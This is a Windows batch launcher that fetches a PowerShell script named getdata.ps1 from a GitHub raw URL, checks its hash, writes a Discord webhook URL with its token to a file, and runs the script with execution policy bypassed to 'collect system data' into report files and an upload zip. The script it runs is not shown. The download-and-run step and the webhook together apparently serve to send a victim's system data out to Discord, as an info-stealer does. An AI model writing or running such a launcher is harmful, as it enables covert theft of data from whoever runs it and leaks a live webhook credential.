@echo off
setlocal enableextensions

set "ROOT=%~dp0"
set "PS1=%ROOT%getdata.ps1"
set "OUT=%ROOT%info.txt"
set "JSON=%ROOT%info.json"
set "ZIP=%ROOT%info_upload.zip"
set "DONE=%ROOT%done.txt"

if not exist "%PS1%" (
    echo Missing file: "%PS1%"
    echo Downloading getdata.ps1...
    curl -L https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1 -o "%PS1%"
    if not exist "%PS1%" (
        echo Download failed. Please add getdata.ps1 manually.
        pause
        exit /b 1
    )
    powershell -NoProfile -Command "$h = (Get-FileHash '%PS1%' -Algorithm SHA256).Hash; $expected = '8BC7BA0D901A3C6818C6408B52EB022D75C50110E68519D7BCDE9473094D1EE7'; if ($h -ne $expected) { Remove-Item '%PS1%' -Force; Write-Host 'HASH MISMATCH: Downloaded file deleted. Do not run unknown files.'; exit 1 }"
    if errorlevel 1 (
        echo Security check failed: getdata.ps1 was deleted. Update the expected hash if you published a new version.
        pause
        exit /b 1
    )
    echo Download verified OK.
)

if exist "%DONE%" del /f /q "%DONE%" >nul 2>nul

echo Collecting system data... this can take a minute.
echo https://discord.com/api/webhooks/1487128618189717606/Jh4fhNACI4jLruL64J8wIfIdC_78LbQ1AJIQSp5lCtysEpOX7fJe8_ak6tUxT5A9C6HZ>discord_webhook.txt
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%"
if errorlevel 1 (
    echo.
    echo Data collection returned an error.
    pause
    exit /b 1
)

if not exist "%OUT%" (
    echo.
    echo No report was created at "%OUT%".
    pause
    exit /b 1
)

if not exist "%JSON%" (
    echo.
    echo No JSON report was created at "%JSON%".
)
echo Finished.
pause
exit /b 0
